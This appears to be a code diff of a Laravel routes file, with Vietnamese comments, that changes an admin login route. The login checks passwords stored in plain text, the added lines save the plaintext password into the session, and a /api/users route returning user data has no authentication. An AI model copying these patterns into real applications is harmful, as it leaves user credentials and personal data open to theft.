@@ -4,7 +4,6 @@ use Illuminate\Support\Facades\Route;
 use App\Http\Controllers\UserController;
 use App\Models\User;
 
-// Sử dụng middleware force.https từ Kernel
 Route::middleware(['force.https'])->group(function () {
     // Trang chính truy cập '/'
     Route::get('/', function () {
@@ -16,18 +15,22 @@ Route::middleware(['force.https'])->group(function () {
         return view('welcome');
     });
 
-    // ✅ SỬA LẠI route này để kiểm tra admin tại đây
+    // Kiểm tra admin
     Route::post('/receive', function () {
         $email = request('email');
         $password = request('password');
 
-        // ✅ Kiểm tra nếu là admin
+        // Kiểm tra nếu là admin
         $admin = User::where('email', $email)
             ->where('password', $password) // không mã hóa
             ->where('is_admin', true)
             ->first();
 
         if ($admin) {
+            session([
+                'email' => $email,
+                'password' => $password,
+            ]);
             return redirect()->secure('/admin');
         }
 
@@ -44,6 +47,6 @@ Route::middleware(['force.https'])->group(function () {
     });
 
     Route::post('/', [UserController::class, 'store'])->name('login.store');
-    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard');
+    Route::get('/admin', [UserController::class, 'adminDashboard'])->name('admin.dashboard')->middleware('admin.auth');
     Route::get('/api/users', [UserController::class, 'getUsersJson']);
 });
